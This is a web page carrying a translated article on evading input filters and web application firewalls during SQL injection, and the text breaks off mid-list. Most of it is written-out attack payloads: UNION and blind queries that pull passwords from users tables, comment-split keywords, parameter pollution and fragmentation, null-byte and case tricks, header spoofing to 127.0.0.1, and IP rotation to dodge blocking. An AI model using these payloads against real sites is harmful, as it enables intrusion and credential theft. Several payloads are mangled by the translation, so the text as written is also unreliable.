<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Methods for circumventing web application security tools when using SQL injection</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="When developing modern web applications, you must use protective equipment. Nevertheless, it is worth understanding how they work, to apply them effec...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Methods for circumventing web application security tools when using SQL injection</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/932/702/983/9327029838f49839472ca640e7925bae.jpg" alt="image"><br><p><br>  When developing modern web applications, you must use protective equipment.  Nevertheless, it is worth understanding how they work, to apply them effectively and to realize that they are not a panacea for hacker attacks.  The article will discuss ways to bypass the filtering and protection of web applications during the operation of sql injections. </p><a name="habracut"></a><br><p>  Before proceeding with the consideration of circumvention options, let us define what protection means today, both native and "built-in". </p><br><h2>  Protection </h2><br><p>  From native means it is possible to select various validators or converters of incoming data.  They can be both self-written and use programming language functions.  For example, the following functions are common in php environments: </p><br><ul><li>  mysql_escape_string - escapes a string for use in mysql_query; </li><li>  addslashes - escapes special characters in the string; </li><li>  htmlspecialchars - converts special characters into HTML entities; </li><li>  mysql_real_escape_string - escapes special characters in unescaped_string; </li><li>  intval is a type conversion function. </li></ul><br><p>  Most of these functions are designed to transform "dangerous" characters, based on the context of use.  The most effective protection from the above is Intval. </p><br><p>  Two ways can be distinguished in the "built-in" protection tools - web application protection by means of a web application (framework), or protection using third-party tools, for example, in the form of a web application firewall.  The first example is the use of HTMLPurifier: this library clears html code from all malicious, non-valid, forbidden (by your configuration) parts of the code, including some attributes. </p><br><h2>  Protective bypass </h2><br><p>  To bypass security tools, you need to know a few things - what a web application consists of, what and how it is protected, as well as a deep knowledge of the platform and the logic of the web application. </p><br><p>  From the simplest examples: the functionality of modern sites contains quite a few forms that allow the user to upload arbitrary files to the server.  These can be images, documents, pdf files, etc.  Web developers often use the concept of a ‚Äúblacklist‚Äù that directly prohibits the download of potentially dangerous file types: .phtml .php .php3 .php4 .php5 .php6 .phps .cgi .exe .pl .asp .aspx .shtml .shtm .fcgi. fpl .jsp .htm .html .wml.  Using the blacklist will not protect the site owner from the potential risks of circumventing filtering.  For example, in the new version of PHP 7, a new .php7 extension has been added, which will allow to bypass filtering.  Not all developers know about this and have managed to add it to the blacklist.  Also in the above listing of extensions is missing .pht. </p><br><p>  Logically, knowing how protection is built (by examining the code, if available, or the filtering logic), you can try to bypass it.  This can be either a blacklist or filtering dangerous structures using regular expressions, data transformation or normalization. </p><br><h3>  The following techniques are used to bypass: </h3><br><p>  <strong>Zerobyte injection</strong> : use% 00 before malicious payload.  Protection tools can ignore all characters after zero-termination, but at the same time send the entire request to the web server. </p><br><p>  <strong>Mixed content:</strong> when using case-sensitive regular expressions, you can bypass defenses using mixed content: for example, we convert </p><br><pre><code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre> <br><p>  at </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">sCrIPt</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre> <br><p>  <strong>Inline comments:</strong> use a comment in an attack request.  For example, </p><br><pre> <code class="hljs pgsql">/ *! <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * /</code> </pre> <br><p>  can be skipped with a defensive feature, but processed in the target web application. </p><br><p>  <strong>Fragmented requests (chunked): the</strong> use of coded HTTP requests to separate malicious payloads into several HTTP requests. </p><br><p>  <strong>Buffer overflow:</strong> if we can form a request that will cause a buffer overflow of the protective mechanism, we can bypass the protective measures (both in the case of successful exploitation of the protection vulnerability itself, and without operation in the event of an application crash). </p><br><p>  <strong>HTTP Parameter Pollution</strong> : HTTP request parameters are pairs consisting of a key and a value separated by the = symbol.  The first request can be processed with a protective tool, but the second one will be executed on the side of the web application.  <strong>&amp;</strong> <strong>,;</strong>  etc. </p><br><p>  <strong>URL encoding (hex)</strong> : use hexadecimal representation of characters, such as% 27 quotes.  This in itself may not be sufficient for many modern means of protection, but can be used in combination with other circumvention methods.  There may be other conversion functions, such as the reverse function: </p><br><pre> <code class="hljs pgsql">reverse(<span class="hljs-string"><span class="hljs-string">'&gt;tpircs/&lt;)niamod.tnemucod(trela&gt;tpircs&lt;'</span></span>)</code> </pre> <br><p>  <strong>Separation of keywords</strong> : here you can use the features of the protection for the introduction of payload - add special characters, etc.  as a separator, they are cut out with protective agents and at the output we get a processed but whole payload: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">SEL</span></span> &lt;ECT</code> </pre> <br><p>  will be processed and an angle bracket will be cut out of it, we will get the output </p><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span></code> </pre> <br><p>  <strong>Duplication of keywords</strong> : this method is similar to the previous one - we add a stop word to the query in order to trick the protection mechanism: </p><br><pre> <code class="hljs">SELECTSELECT</code> </pre> <br><p>  will be processed and the first SELECT will be cut out of it, we will get the output </p><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span></code> </pre> <br><p>  <strong>Reset session cookies</strong> : in order to avoid filtering out frequent non-legitimate requests, you must reset the session for each request. </p><br><p>  <strong>IP reputation</strong> : as in the previous example, with frequent requests from the same IP - all the others from this address can be blocked.  Using multiple addresses to attack can help circumvent this limitation. </p><br><p>  <strong>Header injection</strong> : sometimes you can make it clear to the application that the request came from a trusted network.  In the absence of due checks, you can substitute a trusted address, for example, 127.0.0.1 in the following fields: </p><br><pre> <code class="hljs objectivec">X-forwarded-<span class="hljs-keyword"><span class="hljs-keyword">for</span></span> X-remote-IP X-originating-IP x-remote-addr</code> </pre> <br><h2>  Popular sql injection protection bypass methods </h2><br><p>  There are two types of injections - in string or numeric parameter: </p><br><p>  String </p><br><pre> <code class="hljs pgsql">Example: <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> example = <span class="hljs-string"><span class="hljs-string">'Example'</span></span></code> </pre> <br><p>  Numerical </p><br><pre> <code class="hljs sql">Example: <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span> = <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br><p>  Injections are divided into several types, depending on the DBMS or injection conditions, and bypass methods of protection depend on it. </p><br><p>  The most common misconception is filtering a single quote: i.e.  if the quotes in the request are not present, then the injection (separation of the request) is impossible.  Therefore, we will not separate the request, we will combine it with the help of the UNION operator, and for convenience we will also take a non-existent ID: </p><br><pre> <code class="hljs pgsql">example.site/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php?id=<span class="hljs-number"><span class="hljs-number">-1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">UNION</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> users</code> </pre> <br><p>  Bypass normalization: </p><br><pre> <code class="hljs pgsql"> /? Id = <span class="hljs-number"><span class="hljs-number">1</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">union</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> + <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span> / *</code> </pre> <br><p>  such a request will be blocked, so we will form an obfuscated request: </p><br><pre> <code class="hljs objectivec"> /?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">/*union*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*select*/</span></span>select+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span><span class="hljs-comment"><span class="hljs-comment">/*</span></span></code> </pre> <br><p>  which after normalization with protective agents: </p><br><pre> <code class="hljs objectivec">?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">/*uni X on*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*sel X ect*/</span></span>select+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span><span class="hljs-comment"><span class="hljs-comment">/*</span></span></code> </pre> <br><p>  "assemble" into the required payload: </p><br><pre> <code class="hljs pgsql"> /? Id = <span class="hljs-number"><span class="hljs-number">1</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">union</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> + <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span> / *</code> </pre> <br><p>  Similar query example: </p><br><pre> <code class="hljs objectivec"> /?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>+un<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>ion+sel<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>ect+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>--</code> </pre> <br><p>  will also "assemble" into the required payload: </p><br><pre> <code class="hljs pgsql"> /? Id = <span class="hljs-number"><span class="hljs-number">1</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">union</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> + <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span> / *</code> </pre> <br><p>  You can use request splitting (HTTP Parameter Pollution): <br>  vulnerable code: </p><br><pre> <code class="hljs sql">SQL=" <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">key</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">id</span></span>= <span class="hljs-string"><span class="hljs-string">"+Request.QueryString("</span></span><span class="hljs-keyword"><span class="hljs-keyword">id</span></span><span class="hljs-string"><span class="hljs-string">")</span></span></code> </pre> <br><p>  we split the query: </p><br><pre> <code class="hljs pgsql"> /?id=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;id=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;id=*/</span></span>pwd<span class="hljs-comment"><span class="hljs-comment">/*&amp;id=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">from</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;id=*/</span></span>users</code> </pre> <br><p>  converted to: </p><br><pre> <code class="hljs pgsql"> id=<span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*,*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span><span class="hljs-comment"><span class="hljs-comment">/*,*/</span></span>pwd<span class="hljs-comment"><span class="hljs-comment">/*,*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">from</span></span><span class="hljs-comment"><span class="hljs-comment">/*,*/</span></span>users</code> </pre> <br><p>  You can also use request fragmentation (HTTP Parameter Fragmentation): <br>  vulnerable code: </p><br><pre> <code class="hljs smalltalk"> <span class="hljs-type"><span class="hljs-type">Query</span></span>(<span class="hljs-comment"><span class="hljs-comment">"select * from table where a="</span></span>.<span class="hljs-string"><span class="hljs-string">$_</span></span>GET[<span class="hljs-string"><span class="hljs-string">'a'</span></span>].<span class="hljs-comment"><span class="hljs-comment">" and b="</span></span>.<span class="hljs-string"><span class="hljs-string">$_</span></span>GET[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]); <span class="hljs-type"><span class="hljs-type">Query</span></span>(<span class="hljs-comment"><span class="hljs-comment">"select * from table where a="</span></span>.<span class="hljs-string"><span class="hljs-string">$_</span></span>GET[<span class="hljs-string"><span class="hljs-string">'a'</span></span>].<span class="hljs-comment"><span class="hljs-comment">" and b="</span></span>.<span class="hljs-string"><span class="hljs-string">$_</span></span>GET[<span class="hljs-string"><span class="hljs-string">'b'</span></span>].<span class="hljs-comment"><span class="hljs-comment">" limit"</span></span>.<span class="hljs-string"><span class="hljs-string">$_</span></span>GET[<span class="hljs-string"><span class="hljs-string">'c'</span></span>]);</code> </pre> <br><p>  we fragmented: </p><br><pre> <code class="hljs pgsql"> /?a=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;b=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span> /?a=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;b=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>,pass<span class="hljs-comment"><span class="hljs-comment">/*&amp;c=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">from</span></span>+users<span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br><p>  we receive request: </p><br><pre> <code class="hljs sql"> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> a=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/* and b=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> a=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">union</span></span><span class="hljs-comment"><span class="hljs-comment">/* and b=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>,pass<span class="hljs-comment"><span class="hljs-comment">/* limit */</span></span><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span><span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br><p>  We use logical operators: </p><br><pre> <code class="hljs pgsql"> /?id=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">OR</span></span>+<span class="hljs-number"><span class="hljs-number">0x50</span></span>=<span class="hljs-number"><span class="hljs-number">0x50</span></span> /?id=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">and</span></span>+ascii(lower(mid((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+pwd+<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>+users+<span class="hljs-keyword"><span class="hljs-keyword">limit</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>),<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)))=<span class="hljs-number"><span class="hljs-number">74</span></span></code> </pre> <br><p>  Instead of the equal sign, you can use the negation and inequality signs (! =, &lt;&gt;, &lt;,&gt;). </p><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">2</span></span>&lt;<span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-string"><span class="hljs-string">'a'</span></span>=<span class="hljs-string"><span class="hljs-string">'a'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-string"><span class="hljs-string">'a'</span></span>&lt;&gt;<span class="hljs-string"><span class="hljs-string">'b'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-type"><span class="hljs-type">char</span></span>(<span class="hljs-number"><span class="hljs-number">32</span></span>)=<span class="hljs-string"><span class="hljs-string">' '</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">3</span></span>&lt;=<span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>&lt;=&gt;<span class="hljs-number"><span class="hljs-number">4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span>&lt;=&gt;<span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> <span class="hljs-keyword"><span class="hljs-keyword">null</span></span></code> </pre> <br><p>  Naturally, it is possible to combine various methods to achieve a workaround result.  An example of different requests for one value: </p><br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)=<span class="hljs-string"><span class="hljs-string">'*'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)=<span class="hljs-number"><span class="hljs-number">0x2a</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)=<span class="hljs-keyword"><span class="hljs-keyword">unhex</span></span>(<span class="hljs-string"><span class="hljs-string">'2a'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>) regexp <span class="hljs-string"><span class="hljs-string">'[*]'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">like</span></span> <span class="hljs-string"><span class="hljs-string">'*'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">rlike</span></span> <span class="hljs-string"><span class="hljs-string">'[*]'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ord</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>))=<span class="hljs-number"><span class="hljs-number">42</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ascii</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>))=<span class="hljs-number"><span class="hljs-number">42</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> find_in_set(<span class="hljs-string"><span class="hljs-string">'2a'</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">hex</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">mid</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)))=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">position</span></span>(<span class="hljs-number"><span class="hljs-number">0x2a</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> = <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-keyword"><span class="hljs-keyword">locate</span></span>(<span class="hljs-number"><span class="hljs-number">0x2a</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)=<span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre> <br><p>  Such attacks can successfully pass under the following conditions: </p><br><ul><li>  Vulnerabilities in query normalization functions. </li><li>  Use of HPP and HPF technologies. </li><li>  Bypass filtering rules (signatures). 